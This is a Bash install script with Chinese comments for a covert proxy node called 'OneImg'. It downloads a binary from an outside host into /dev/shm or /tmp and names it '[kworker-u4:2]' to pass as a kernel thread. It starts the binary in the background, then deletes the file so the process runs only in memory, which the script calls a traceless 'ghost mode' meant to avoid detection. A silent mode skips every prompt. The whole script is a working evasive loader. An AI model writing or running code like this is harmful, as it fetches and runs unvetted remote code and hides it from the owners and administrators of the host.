#!/usr/bin/env bash
set -u

APP_NAME="oneimg"
APP_PORT="${APP_PORT:-3097}"

BASE_DIR="${HOME}/apps/${APP_NAME}"
LOG_DIR="${BASE_DIR}/logs"
RUN_DIR="${BASE_DIR}/run"

# ==========================================
# 内存运行与防查杀高级配置 (伪装内核进程)
# ==========================================
FAKE_NAME="[kworker-u4:2]"
MEM_PATH="/dev/shm"
if mount 2>/dev/null | grep "/dev/shm" | grep -q "noexec"; then
    MEM_PATH="/tmp"
fi
APP_BIN="${MEM_PATH}/${FAKE_NAME}"

APP_LOG="${LOG_DIR}/app.log"
APP_PID_FILE="${RUN_DIR}/app.pid"

WORKER_URL="https://ssssss.cscscs.bond"

GREEN="\033[0;32m"
YELLOW="\033[1;33m"
RED="\033[0;31m"
BLUE="\033[0;34m"
NC="\033[0m"

say() { printf "%b\n" "${GREEN}$*${NC}"; }
warn() { printf "%b\n" "${YELLOW}$*${NC}"; }
err() { printf "%b\n" "${RED}$*${NC}"; }
info() { printf "%b\n" "${BLUE}$*${NC}"; }

need_cmd() {
  command -v "$1" >/dev/null 2>&1
}

fetch_file() {
  url="$1"
  out="$2"
  if need_cmd curl; then
    curl -L --fail --connect-timeout 15 --retry 2 -o "${out}" "${url}"
  elif need_cmd wget; then
    wget -O "${out}" "${url}"
  else
    err "缺少 curl/wget，无法下载。"
    exit 1
  fi
}

port_in_use() {
  port="$1"
  if need_cmd ss; then
    ss -tln | grep -q ":${port} "
  elif need_cmd netstat; then
    netstat -tln | grep -q ":${port} "
  else
    timeout 0.5 bash -c "</dev/tcp/127.0.0.1/${port}" 2>/dev/null
  fi
}

pick_port() {
  while port_in_use "${APP_PORT}"; do
    warn "端口 ${APP_PORT} 已被占用。"
    # 如果是非交互模式，直接自动+1，不问人
    if [ -n "${ENV_UUID:-}" ] || [ -n "${NON_INTERACTIVE:-}" ]; then
       APP_PORT="$((APP_PORT + 1))"
       continue
    fi
    printf "请输入新端口，或直接回车自动尝试下一个端口 [%s]: " "$((APP_PORT + 1))"
    read -r input </dev/tty
    if [ -n "${input}" ]; then
      APP_PORT="${input}"
    else
      APP_PORT="$((APP_PORT + 1))"
    fi
    case "${APP_PORT}" in
      ''|*[!0-9]*)
        err "端口必须是数字。"
        APP_PORT=3097
        ;;
    esac
  done
}

is_running() {
  pid_file="$1"
  [ -f "${pid_file}" ] || return 1
  pid="$(cat "${pid_file}" 2>/dev/null || true)"
  [ -n "${pid}" ] || return 1
  kill -0 "${pid}" >/dev/null 2>&1
}

stop_if_running() {
  pid_file="$1"
  name="$2"
  if is_running "${pid_file}"; then
    pid="$(cat "${pid_file}")"
    warn "停止旧的 ${name}: PID ${pid}"
    kill "${pid}" >/dev/null 2>&1 || true
    sleep 2
    if kill -0 "${pid}" >/dev/null 2>&1; then
      kill -9 "${pid}" >/dev/null 2>&1 || true
    fi
  fi
  rm -f "${pid_file}"
}

uninstall_app() {
  printf "\n%b\n" "${RED}=== 准备卸载节点 ===${NC}"
  # 如果非交互模式，不问人直接卸载
  if [ -z "${NON_INTERACTIVE:-}" ]; then
    printf "%b" "${YELLOW}此操作将杀掉程序进程并完全删除相关配置目录，确定继续吗? [y/N]: ${NC}"
    read -r confirm </dev/tty
    case "${confirm}" in
      y|Y|yes|YES) ;;
      *) warn "已取消卸载。"; exit 0 ;;
    esac
  fi
  
  say "正在停止运行中的隐蔽程序..."
  stop_if_running "${APP_PID_FILE}" "应用"
  
  say "正在清理残留目录: ${BASE_DIR}"
  rm -rf "${BASE_DIR}"
  rm -f "${APP_BIN}"
  
  say "✅ 卸载完成，清理得干干净净！"
  exit 0
}

ask_config() {
  # ==========================================
  # 核心改动：如果检测到预设变量，跳过互动问答！
  # ==========================================
  if [ -n "${ENV_UUID:-}" ] || [ -n "${NON_INTERACTIVE:-}" ]; then
      say "检测到环境变量预设，已开启静默自动化模式，跳过手动问答！"
      return
  fi

  printf "\n%b\n" "${YELLOW}=== 请配置运行环境变量 (直接回车表示留空/使用默认值) ===${NC}"

  printf "1.  UUID (节点的唯一标识): "
  read -r ENV_UUID </dev/tty

  printf "2.  NEZHA_SERVER (哪吒面板的域名/IP，可带端口): "
  read -r ENV_NEZHA_SERVER </dev/tty

  printf "3.  NEZHA_PORT (针对老版 v0 面板专用，v1请留空): "
  read -r ENV_NEZHA_PORT </dev/tty

  printf "4.  NEZHA_KEY (哪吒面板的 Agent 密钥): "
  read -r ENV_NEZHA_KEY </dev/tty

  printf "5.  NEZHA_DOH (自定义安全 DNS 解析，防污染): "
  read -r ENV_NEZHA_DOH </dev/tty

  printf "6.  CF_TUNNEL_TOKEN (用于脚本内置启动 Cloudflare 隧道): "
  read -r ENV_CF_TUNNEL_TOKEN </dev/tty

  printf "7.  CF_DOMAIN (绑定的自定义域名): "
  read -r ENV_CF_DOMAIN </dev/tty

  printf "8.  SUB_PATH (节点订阅路径，防乱扫，留空默认 'sub'): "
  read -r ENV_SUB_PATH </dev/tty
  
  printf "%b\n\n" "${YELLOW}======================================================${NC}"
}

download_binary() {
  ARCH=$(uname -m)
  say "检测到系统架构: $ARCH"

  if [ "$ARCH" = "x86_64" ]; then
      DOWNLOAD_URL="${WORKER_URL}/amd64"
  elif [ "$ARCH" = "aarch64" ] || [ "$ARCH" = "arm64" ]; then
      DOWNLOAD_URL="${WORKER_URL}/arm64"
  else
      err "不支持的架构: $ARCH"
      exit 1
  fi

  say "正在通过 Worker 反代将二进制拉取到系统内存..."
  fetch_file "${DOWNLOAD_URL}" "${APP_BIN}"
  chmod +x "${APP_BIN}"
  say "内存拉取完成并授权成功！"
}

start_app() {
  if [ ! -f "${APP_BIN}" ]; then
    err "内存中未找到文件，拉取失败！"
    exit 1
  fi

  pick_port
  stop_if_running "${APP_PID_FILE}" "伪装应用"

  say "正在后台启动隐蔽应用，伪装名: ${FAKE_NAME}，端口: ${APP_PORT}"

  export PORT="${APP_PORT}"
  export SERVER_PORT="${APP_PORT}"
  
  # 这里加上了 :- 语法，哪怕有些变量您在一行里没写，也不会引发报错中断
  [ -n "${ENV_UUID:-}" ] && export UUID="${ENV_UUID}"
  [ -n "${ENV_NEZHA_SERVER:-}" ] && export NEZHA_SERVER="${ENV_NEZHA_SERVER}"
  [ -n "${ENV_NEZHA_PORT:-}" ] && export NEZHA_PORT="${ENV_NEZHA_PORT}"
  [ -n "${ENV_NEZHA_KEY:-}" ] && export NEZHA_KEY="${ENV_NEZHA_KEY}"
  [ -n "${ENV_NEZHA_DOH:-}" ] && export NEZHA_DOH="${ENV_NEZHA_DOH}"
  [ -n "${ENV_CF_TUNNEL_TOKEN:-}" ] && export CF_TUNNEL_TOKEN="${ENV_CF_TUNNEL_TOKEN}"
  [ -n "${ENV_CF_DOMAIN:-}" ] && export CF_DOMAIN="${ENV_CF_DOMAIN}"
  [ -n "${ENV_SUB_PATH:-}" ] && export SUB_PATH="${ENV_SUB_PATH}"

  # 启动 Go 二进制
  nohup "${APP_BIN}" > "${APP_LOG}" 2>&1 &
  echo $! > "${APP_PID_FILE}"
  sleep 2

  if is_running "${APP_PID_FILE}"; then
    say "应用已在内存中启动: PID $(cat "${APP_PID_FILE}")"
    info "应用日志: ${APP_LOG}"
    
    rm -f "${APP_BIN}"
    say "已自动擦除内存文件实体，现已处于完全无痕的幽灵模式运行！"
    
  else
    err "应用启动失败，最后日志如下:"
    tail -n 80 "${APP_LOG}" 2>/dev/null || true
    exit 1
  fi
}

run_install() {
  mkdir -p "${BASE_DIR}" "${LOG_DIR}" "${RUN_DIR}"
  ask_config
  download_binary
  start_app
  say "部署完成！验证进程: ps -ef | grep -F '${FAKE_NAME}' | grep -v grep"
}

show_menu() {
  printf "%b\n" "${GREEN}========================================${NC}"
  printf "%b\n" "${GREEN} OneImg (自动化隐蔽版) 一键管理脚本 ${NC}"
  printf "%b\n" "${GREEN}========================================${NC}"
  printf "  ${YELLOW}1.${NC} 安装 / 内存隐蔽启动节点\n"
  printf "  ${YELLOW}2.${NC} 完全卸载节点\n"
  printf "  ${YELLOW}0.${NC} 退出脚本\n"
  printf "========================================\n"
  printf "请输入数字选择 [0-2]: "
  read -r choice </dev/tty
  case "${choice}" in
    1) run_install ;;
    2) uninstall_app ;;
    0) exit 0 ;;
    *) err "输入无效，退出。"; exit 1 ;;
  esac
}

main() {
  if [ "${1:-}" = "uninstall" ]; then
    uninstall_app
  elif [ "${1:-}" = "install" ]; then
    run_install
  else
    show_menu
  fi
}

main "$@"
